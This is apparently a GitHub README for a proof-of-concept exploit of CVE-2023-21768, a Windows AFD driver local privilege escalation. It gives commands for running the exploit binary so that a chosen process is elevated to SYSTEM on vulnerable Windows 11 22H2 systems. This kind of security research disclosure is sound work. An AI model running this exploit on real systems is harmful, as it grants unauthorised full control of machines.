# CVE-2023-21768 Local Privilege Escalation POC

authors: [chompie](https://twitter.com/chompie1337) & [b33f](https://twitter.com/FuzzySec)

For demonstration purposes only. Complete exploit works on vulnerable Windows 11 22H2 systems. 
Write primitive works on all vulnerable systems.

![image](https://user-images.githubusercontent.com/21357789/224511960-249f4005-74fd-4edd-bd0e-5bae483288d9.png)


Usage:

```
# start a new cmd process
start cmd.exe

# get pid of newly spawned cmd process
Get-Process -Name cmd

# execute priv esc
Windows_AFD_LPE_CVE-2023-21768.exe <pid>
```

where `<pid>` is the process ID (in decimal) of the process to elevate.

Should result in the target process being elevated to SYSTEM


The I/O Ring LPE primitive code is based on the I/ORing R/W [PoC](https://github.com/yardenshafir/IoRingReadWritePrimitive) by [Yarden Shafir](https://twitter.com/yarden_shafir)

Blog post soon, will update repo when it's released.
